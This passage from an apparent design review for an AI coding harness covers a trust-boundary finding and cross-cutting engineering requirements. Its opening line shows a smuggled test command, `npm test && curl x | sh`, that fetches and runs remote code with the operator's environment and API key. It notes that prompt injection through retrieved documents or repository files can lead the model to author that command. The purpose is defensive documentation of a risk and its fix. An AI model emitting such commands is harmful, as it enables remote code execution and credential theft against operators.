`testCommand: "npm test && curl x | sh"` gets arbitrary code execution with the operator's
environment, including `CURSOR_API_KEY`. Prompt injection via a retrieved document or a repository
file is a live path to this.

**Add to the README**, in a new `## Trust boundary` section near "Git ownership":

- State plainly that the harness executes commands in the repository root with the operator's
  environment, and that `task.testCommand` is the one field on that path whose value originates
  from a model rather than the config.
- State the mitigation available today: pin `workflow.tdd` and review planner output before
  execution, or run the harness in a container/VM when operating on untrusted repositories or with
  untrusted documents in the knowledge index.
- State the intended fix so it is not rediscovered as a novel finding: allowlist `task.testCommand`
  against `config.commands.test` and `config.commands.gates[].command`, and model per-task
  targeting as a scoped `testFilter` argument interpolated into a config-owned template rather than
  as a free-form command string.

**Add to `docs/roadmap.md`** under "Deliberately deferred" as *"Command allowlisting for
model-authored test targets"*, with a one-line summary and a pointer to the README section.

---

# Cross-cutting requirements

**Schema compatibility.** Every new `RunState` / `BuildTask` field carries a Zod `.default()` or is
`.optional()`. `CONTRACT_VERSION` stays `"2"`. Add one test that loads a `state.json` captured
*before* this work and parses it without error — commit that fixture under `tests/fixtures/`.

**Config version.** Bump `CONFIG_VERSION` once, to `4`, covering items 4, 7, 8, 10, 11, and 12a
collectively. In `ensureCompatibleConfiguration`, the `configVersion < CONFIG_VERSION` migration
branch must **re-stamp `state.configurationHash` from the current config** as part of the migration
record, before any hash comparison — otherwise every existing run blocks permanently the moment
this ships. The current code returns early on migration, which is the right shape; it just needs
to update the hash too.

**Config hash normalisation.** Item 9 of the review, folded in here since it interacts with the
migration above: `configurationHash` (`engine.ts:1326`) hashes the entire config including
`repositoryRoot`, which `config.ts:233` resolves to an *absolute* path. Move or re-clone the repo
and every in-flight run fails `ensureCompatibleConfiguration` permanently, with no way back since
`retry()` does not touch the hash. Replace it with a hash over a **canonicalised** config — keys
sorted recursively, and `repositoryRoot`, `stateDirectory`, and `knowledge.sharedIndexDirectory`
omitted, since those are environment rather than policy. The `CONFIG_VERSION` bump plus the
re-stamping migration is what makes this change safe for existing runs.

**README updates.** Items 2, 4, 7, 8, 9, 10, 11, 12, and 13 each change documented behaviour. Fold
them into the existing sections rather than appending a changelog: the unknowns register section
(dropped status), the durable-artifacts table (`steps.jsonl`, `activity.json`, `cancel.request`),
the commands list (`unlock`, new `retry` flags), the config listing (every new key), and the
dashboard section (usage, activity, new remediation copy).

**ADR.** Items 8, 9, and 10 change the operating model rather than an implementation detail — a
run now has a spend ceiling, runs serialise on the repository, and intervention is out-of-band.
Write **one** ADR, `docs/adr/0009-operational-intervention-and-budgets.md`, following the format of
0004 and 0008. Cover: why cancellation must bypass the queue; why the repository is the correct
lock granularity given a shared working tree, and that worktree isolation supersedes it; why usage
is recomputed from session files rather than incremented; and why the reviewer stays cold while the
implementer retains its session.

**Commit granularity.** One commit per numbered item, each with its tests, each leaving the suite
green. Do not batch a phase into a single commit — several of these are independently revertable
and should stay that way.
